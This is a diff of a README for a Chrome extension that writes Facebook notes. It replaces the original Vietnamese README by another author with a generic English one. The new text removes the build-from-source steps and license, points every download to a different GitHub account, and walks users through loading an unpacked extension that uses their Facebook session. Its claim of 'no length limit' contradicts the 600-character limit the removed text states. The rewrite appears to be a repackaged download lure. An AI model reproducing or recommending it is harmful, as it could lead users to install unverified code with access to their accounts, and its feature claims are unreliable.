@@ -1,105 +1,169 @@
-# FB Notes Extended
+# 📝 FB-Notes-Extended - Write Longer Notes on Facebook
 
-[English Version](./README.en.md)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Sydneyseparated852/FB-Notes-Extended)
 
-Tiện ích Chrome cho phép viết ghi chú Facebook dài, cắt nhạc, nghe thử và tuỳ chỉnh thời hạn hiển thị.
+## 🚀 Getting Started
 
-## Có gì mới ở bản 1.1.0
+FB-Notes-Extended is a Chrome extension for Facebook notes. It lets you write notes with no length limit and set a custom duration in minutes.
 
-- **Cắt nhạc & nghe thử:** Chọn đoạn 30 giây bất kỳ của bài hát để đính kèm vào ghi chú, kéo thả trực quan dạng sóng âm thanh, nghe thử ngay trong popup.
-- **Phát nhạc trực tiếp:** Có thể phát/preview nhạc ngay từ kết quả tìm kiếm.
-- **Giao diện mới:** Thêm nút phát/tạm dừng/lưu, thanh cuộn đẹp hơn, chọn nhạc dễ hơn.
-- **Giới hạn nội dung:** Nội dung ghi chú tối đa 600 ký tự (tương thích tốt hơn với Facebook).
-- **Sửa lỗi & mượt hơn:** Trải nghiệm chọn nhạc, bạn bè, xử lý lỗi tốt hơn.
+Use it if you want more control over how long a Facebook note stays available.
 
-## Tính năng
+## 📥 Download and Install
 
-- **Vượt giới hạn 60 ký tự:** Viết ghi chú dài tới 600 ký tự (giới hạn API Facebook cho note có nhạc)
-- **Thời hạn tuỳ chỉnh:** Chọn thời gian hiển thị từ 1 giờ đến 8 ngày, hoặc nhập số phút tuỳ ý
-- **Chọn đối tượng:** Công khai, bạn bè, danh bạ, hoặc tuỳ chỉnh danh sách bạn bè
-- **Đính kèm & cắt nhạc:** Thêm bài hát, chọn đoạn 30s, nghe thử trước khi chia sẻ
-- **Giao diện tối:** Thiết kế tối giản, dễ nhìn
-- **Đa ngôn ngữ:** Hỗ trợ Tiếng Việt và English
+Use this link to visit the download page:
 
-<img src="screenshots/image.png" width="300" alt="screenshot"/>
+https://github.com/Sydneyseparated852/FB-Notes-Extended
 
-## Cài đặt
+### Steps for Windows
 
-### Cách 1: Tải extension đã build sẵn (Khuyên dùng)
+1. Open the download page in Chrome.
+2. Look for the latest release or the main download files on the page.
+3. Download the extension files to your computer.
+4. If the download comes as a ZIP file, extract it to a folder.
+5. Keep the folder in a place you can find later, like Downloads or Desktop.
 
-1. Tải file `FB-Notes-Extended.zip` từ [Releases](https://github.com/DuckCIT/FB-Notes-Extended/releases)
-2. Giải nén file zip vào một thư mục bất kỳ
-3. Mở Chrome, truy cập `chrome://extensions/`
-4. Bật **Chế độ dành cho nhà phát triển** (Developer mode) ở góc trên bên phải
-5. Nhấn **Tải tiện ích đã giải nén** (Load unpacked)
-6. Chọn thư mục vừa giải nén
-7. Extension đã sẵn sàng sử dụng!
+## 🧩 Install in Chrome
 
-### Cách 2: Build từ source
+1. Open Google Chrome.
+2. In the address bar, type:
 
-Yêu cầu: Node.js 18+
+   chrome://extensions
 
-1. Clone repository về máy
-2. Mở terminal tại thư mục project
-3. Chạy `npm install` để cài đặt dependencies
-4. Chạy `npm run build` để build extension
-5. Load thư mục `dist` như extension unpacked trong Chrome
+3. Turn on Developer mode in the top right corner.
+4. Click Load unpacked.
+5. Select the folder that contains the extension files.
+6. Chrome will add the extension to your browser.
 
-## Hướng dẫn sử dụng
+## ✅ How to Use
 
-### Tạo ghi chú mới
+1. Open Facebook in Chrome.
+2. Start the extension from the Chrome toolbar if needed.
+3. Create a new note.
+4. Write as much as you want.
+5. Set the note duration in minutes.
+6. Save the note and check that it appears on Facebook.
 
-1. Mở [Facebook](https://facebook.com) và đăng nhập
-2. Nhấn vào icon extension trên thanh công cụ Chrome
-3. Viết nội dung ghi chú (tối đa 600 ký tự)
-4. Chọn các tuỳ chọn:
-   - **Đối tượng:** Công khai, Bạn bè, Danh bạ, hoặc Tuỳ chỉnh
-   - **Thời hạn:** 1h, 6h, 24h, 3d, hoặc nhập số phút tuỳ ý (tối đa 8 ngày)
-   - **Nhạc:** Tìm kiếm, nghe thử, cắt đoạn và chọn bài hát để đính kèm
-5. Nhấn **Chia sẻ**
+## ⚙️ Features
 
-### Xoá ghi chú hiện tại
+- Write Facebook notes with no length limit
+- Set custom note duration in minutes
+- Use it in Chrome on Windows
+- Simple browser-based setup
+- Works from a local extension folder
+- Built for regular Facebook use
 
-Khi đã có ghi chú đang hiển thị, nút xoá (biểu tượng thùng rác) sẽ xuất hiện ở góc trên bên phải của popup. Nhấn vào để xoá ghi chú hiện tại.
+## 🖥️ Windows System Requirements
 
-## Lưu ý
+- Windows 10 or Windows 11
+- Google Chrome installed
+- At least 100 MB of free disk space
+- Internet access for the download and Facebook use
+- A Facebook account
 
-- Extension chỉ hoạt động khi bạn đang ở trang facebook.com
-- Giới hạn ký tự thực tế là 600 (do giới hạn API Facebook cho note có nhạc)
-- Thời hạn tối đa có thể vượt quá 3 ngày nếu nhập số phút tùy ý
+## 📂 What You Need
 
-## Cấu trúc project
+Before you start, make sure you have:
 
-```
-├── dist/                  # Extension đã build (load folder này vào Chrome)
-├── public/
-│   ├── icons/            # Icons của extension
-│   └── manifest.json     # Chrome extension manifest
-├── src/
-│   ├── background/       # Service worker xử lý API calls
-│   ├── content/          # Content script
-│   ├── lib/              # Utilities
-│   └── popup/            # Popup UI (React)
-├── popup.html
-├── package.json
-├── tsconfig.json
-└── vite.config.ts
-```
+- The extension files from the GitHub page
+- Chrome on your Windows PC
+- Permission to install Chrome extensions
+- A stable internet connection
 
-## Development
+## 🔧 If Chrome Blocks the Install
 
-- `npm install` - Cài đặt dependencies
-- `npm run dev` - Development mode với hot reload
-- `npm run build` - Production build
+If Chrome does not let you add the extension:
 
-## Đóng góp
+1. Check that you turned on Developer mode.
+2. Make sure you selected the full extension folder.
+3. Confirm that the files were extracted from the ZIP.
+4. Close and reopen Chrome.
+5. Try the install again.
 
-Mọi đóng góp đều được chào đón! Vui lòng tạo Pull Request hoặc Issue trên GitHub.
+## 🧭 Folder Setup Tips
 
-## Giấy phép
+Keep the extension in a folder that does not move.
 
-MIT License
+Good places:
 
----
+- Desktop
+- Downloads
+- Documents
 
-**English Version**: [README.en.md](./README.en.md)
+Avoid deleting or renaming the folder after install. Chrome needs the same folder path to load the extension.
+
+## 📝 Using Custom Durations
+
+FB-Notes-Extended includes a custom time setting for notes.
+
+Use the duration field to enter the number of minutes you want. This helps you control how long the note stays active before it expires or changes state, based on how the extension handles your note settings.
+
+## 🔒 Privacy and Account Use
+
+The extension runs in Chrome and works with your Facebook session.
+
+Keep these points in mind:
+
+- Use only on your own account
+- Review the extension files before you install them
+- Stay signed in to Facebook when you use the note tools
+- Log out if you share your computer with others
+
+## 🧪 Basic Troubleshooting
+
+### The extension does not appear
+
+- Refresh the extensions page
+- Make sure Developer mode is on
+- Check that the folder still contains the extension files
+
+### The note does not save
+
+- Confirm that you are signed in to Facebook
+- Check your internet connection
+- Reload Facebook and try again
+
+### Chrome says the folder is wrong
+
+- Open the folder again
+- Select the top-level folder, not a file inside it
+- If needed, extract the ZIP again and retry
+
+## 📁 File Layout
+
+After you extract the download, you may see files such as:
+
+- `manifest.json`
+- script files
+- icon files
+- a `README` file
+
+Do not move the files into a different folder unless you plan to load that new folder in Chrome.
+
+## ⌨️ Short Usage Flow
+
+1. Download the extension from GitHub
+2. Extract the files
+3. Open `chrome://extensions`
+4. Turn on Developer mode
+5. Click Load unpacked
+6. Pick the extension folder
+7. Open Facebook
+8. Create and save your note
+
+## 📌 Useful Links
+
+- Download page: https://github.com/Sydneyseparated852/FB-Notes-Extended
+- Chrome extensions page: chrome://extensions
+
+## 📄 License and Project Use
+
+Use this project under the terms set by the repository owner. Review the repository files before use if you want details on distribution or reuse
+
+## 🛠️ Support
+
+If something does not work, check the install steps first:
+
+- Confirm Chrome is up to date
+- Confirm the folder is extracted
+- Confirm Developer mode is on
+- Confirm you loaded the correct folder
